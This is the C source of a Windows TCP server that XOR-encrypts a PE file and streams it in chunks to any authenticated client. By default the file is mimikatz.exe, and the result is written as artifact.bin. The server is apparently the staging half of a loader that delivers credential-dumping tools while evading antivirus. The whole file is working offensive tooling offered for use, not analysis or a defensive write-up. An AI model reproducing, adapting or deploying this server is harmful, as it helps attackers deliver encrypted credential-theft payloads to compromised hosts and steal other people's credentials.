#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#pragma warning (disable: 4996)
#pragma comment(lib,"ws2_32.lib")

 ///////////////////////////////////////////////
 //          CONFIGURATION   HERE             //
 ///////////////////////////////////////////////
#define DEFAULT_PORT 6666
#define MAX_CONNNUM 999
#define CHUNK_SIZE 200
#define USLEEP_TIME 0
char authcode[50] = "123456";
char peName[100] = "mimikatz.exe";
char encryptBin[100] = "artifact.bin";
///////////////////////////////////////////////
//          CONFIGURATION   DONE             //
///////////////////////////////////////////////

typedef struct clients_node {
    SOCKET socketClient;
    struct sockaddr_in cSin;
    int isRunning;
    HANDLE h;
}stClientNode, * clientNode;

static stClientNode clients[MAX_CONNNUM] = { 0 };
static SOCKET sockfdServer;
static struct sockaddr_in s_sin;
static int clientNum = 0;

static void analysis(char* data, int datal, clientNode node_t) {
    printf("=====>|%s:%d:<%d>|:%s \n", inet_ntoa(node_t->cSin.sin_addr), node_t->cSin.sin_port, datal, data);
}

DWORD WINAPI eventHandle(LPVOID lpParameter) {
    char revData[256];
    int ret;
    char buff[CHUNK_SIZE];
    char stage1Data[20];
    int i = 0;
    long long len = 0;
    clientNode node = (clientNode)lpParameter;
    //printf("[+] %s:%d is knocking... \n", inet_ntoa(node->cSin.sin_addr), node->cSin.sin_port);
    FILE* fp = fopen(encryptBin, "rb");
    if (fp == NULL) return 0;

    fseek(fp, 0, SEEK_END);
    len = ftell(fp);
    rewind(fp);

    recv(node->socketClient, revData, sizeof(revData), 0);
    if (strcmp(revData, authcode) != 0)
    {
        printf("[Error] auth failed\n");
        printf("AUTH: %s\n", revData);
        send(node->socketClient, "EF", strlen("EF"), 0);
        return 1;
    }

    sprintf(stage1Data, "V %ld", len);
    send(node->socketClient, stage1Data, sizeof(stage1Data), 0);

    while (1) {
        memset(buff, 0, sizeof(buff));
        if (i + sizeof(buff) > len) {
            ret = fread(buff, 1, i + sizeof(buff) - len, fp);
            send(node->socketClient, buff, i + sizeof(buff) - len, 0);
            break;
        }
        else {
            ret = fread(buff, 1, sizeof(buff), fp);
            send(node->socketClient, buff, sizeof(buff), 0);
            i = i + sizeof(buff);
        }
        Sleep(USLEEP_TIME);
    }
    node->isRunning = 0;
    clientNum--;
    fclose(fp);
    return 1;
}


void xorLoopEncryptor(unsigned char* data, unsigned int size) {
    unsigned int j = 0;
    for (unsigned int i = 0; i < (size - 1); i++) {
        j = i + 1;
        if (i == size - 2) {
            j = j - size + 1;
        }
        data[i] = data[i] ^ data[j] + size;
    }
}

void xorChunkEncryptor(unsigned char* data, unsigned int size, unsigned int chunk_max_size) {
    unsigned int offset = 0;
    unsigned int chunk_size = 0;
    while (1) {
        if (offset + chunk_max_size > size) {
            chunk_size = size - offset;
        }
        else {
            chunk_size = chunk_max_size;
        }
        xorLoopEncryptor(data + offset, chunk_size);
        offset += chunk_max_size;
        if (offset >= size) break;
    }
}

void doPEEncryptor() {
    LONGLONG PELength = -1;
    FILE* fp;
    BYTE* PEBuffer;
    errno_t err;
    unsigned int chksum = 0;

    printf("[+] Encrypt the file to be loaded...\n");
    fp = fopen(peName, "rb");
    fseek(fp, 0, SEEK_END);
    PELength = ftell(fp);
    rewind(fp);
    PEBuffer = (BYTE*)malloc((PELength + 1) * sizeof(char));
    fread(PEBuffer, PELength, 1, fp);

    for (long long i = 0; i < PELength; i++) { chksum = PEBuffer[i] * i + chksum / 3; };
    fclose(fp);
    xorChunkEncryptor(PEBuffer, PELength, 1000);

    //printf("---  %s:%ldBytes <chksum:%ud>        -->     %s:%ldBytes        >\n", peName, PELength, chksum,encryptBin, PELength);
    fp = fopen(encryptBin, "wb");
    fwrite(PEBuffer, PELength, 1, fp);
    fclose(fp);
    printf("\n");
}

void startServer(int port) {
    WORD socket_version = MAKEWORD(2, 2);
    WSADATA wsadata;
    if (WSAStartup(socket_version, &wsadata) != 0) {
        printf("[Error] WSAStartup:%d\n", GetLastError());
        exit(0);
    }

    sockfdServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfdServer == INVALID_SOCKET) {
        printf("[Error] socket:%d\n", GetLastError());
        exit(0);
    }
    s_sin.sin_family = AF_INET;
    s_sin.sin_port = htons(port);
    s_sin.sin_addr.S_un.S_addr = INADDR_ANY;
    if (bind(sockfdServer, (LPSOCKADDR)&s_sin, sizeof(s_sin)) == SOCKET_ERROR)
    {
        printf("[Error] socket-bind:%d\n", GetLastError());
    }
    if (listen(sockfdServer, 5) == SOCKET_ERROR)
    {
        printf("[Error] socket-listen:%d\n", GetLastError());
        exit(0);
    }

    printf("[*] Successfully listening on %d ...\n\n", port);

    while (1) {
        SOCKET sockfdClient;
        struct sockaddr_in cSin;
        int csinLen;
        csinLen = sizeof(cSin);
        sockfdClient = accept(sockfdServer, (SOCKADDR*)&cSin, &csinLen);
        if (sockfdClient == INVALID_SOCKET) {
            printf("[Error] accept error\n");
            continue;
        }
        else {
            if (clientNum + 1 > MAX_CONNNUM) {
                send(sockfdClient, "overload\n", strlen("overload\n"), 0);
                printf("[Error] Matched the maximum connection number.<%s:%d>\n", inet_ntoa(cSin.sin_addr), cSin.sin_port);
                Sleep(1000);
                closesocket(sockfdClient);
                continue;
            }
            else {
                int j = 0;
                for (j = 0; j < MAX_CONNNUM; j++) {
                    if (clients[j].isRunning == 0) {
                        clients[j].isRunning = 1;
                        clients[j].socketClient = sockfdClient;
                        clients[j].cSin;
                        memcpy(&(clients[j].cSin), &cSin, sizeof(cSin));
                        if (clients[j].h) {
                            CloseHandle(clients[j].h);
                        }
                        printf("\n[+] %s:%ld is knocking... \n", inet_ntoa(clients[j].cSin.sin_addr), clients[j].cSin.sin_port);
                        clients[j].h = CreateThread(NULL, 0, eventHandle, &(clients[j]), 0, NULL);
                        clientNum++;
                        break;
                    }
                }
            }
        }
    }
    closesocket(sockfdServer);
    WSACleanup();

}

int main(int argc, char* argv[])
{
    int port = DEFAULT_PORT;
    if (argc != 4)
    {
        printf("Usage: %s [port] [PEPath] [AuthCode]", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
        exit(0);
    }
    if (strspn(argv[1], "0123456789") == strlen(argv[1])) {
                port = atoi(argv[1]);
    }

    strcpy(peName, argv[2]);

    strcpy(authcode, argv[3]);

    doPEEncryptor();
    startServer(port);

    return(0);
}